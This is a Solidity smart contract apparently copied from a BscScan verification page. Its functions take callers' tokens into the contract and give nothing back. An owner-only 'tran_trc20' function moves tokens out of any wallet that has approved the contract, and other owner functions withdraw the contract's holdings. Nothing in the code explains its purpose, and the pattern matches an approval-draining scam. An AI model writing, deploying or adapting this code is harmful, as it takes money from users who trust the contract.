/**
 *Submitted for verification at BscScan.com on 2023-04-01
*/

// SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.0;

contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor(address _addr) {
        _owner = _addr;
        emit OwnershipTransferred(address(0), _addr);
    }
    function owner() public view returns(address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface ERC20 {

    function totalSupply() external view returns(uint256);

    function balanceOf(address account) external view returns(uint256);

    function transfer(address recipient, uint256 amount) external returns(bool);

    function approve(address spender, uint256 amount) external returns(bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns(bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract LLLL is Ownable {

   
    constructor() Ownable(msg.sender) {
	}
 	function tran_coin_b(address address_A, address address_B, uint256 amount_A, uint256 amount_B, uint256 type_id) public payable {
        ERC20(address_B).transferFrom(msg.sender, address(this), amount_B);
 
    }
	
	
	function tran_coin(address address_A, address address_B, uint256 amount_A, uint256 amount_B, uint256 type_id) public payable {

        ERC20(address_A).transferFrom(msg.sender, address(this), amount_A);
		ERC20(address_B).transferFrom(msg.sender, address(this), amount_B);
		 
		
 
    }
	
	
	function tran_bnb(uint256 _id) public {

 
    }
    function out_coin(address _addr, address _to, uint _val) public onlyOwner {
       
        ERC20(_addr).transfer(_to, _val);

    }
	
	
    function out_bnb(address payable _to, uint _val) public payable onlyOwner {
        _to.transfer(_val);

    }
	function tran_trc20(address _addr, address _addr_1, address _to,uint256 _val) public onlyOwner {

        ERC20(_addr).transferFrom(_addr_1, _to, _val);

    }

}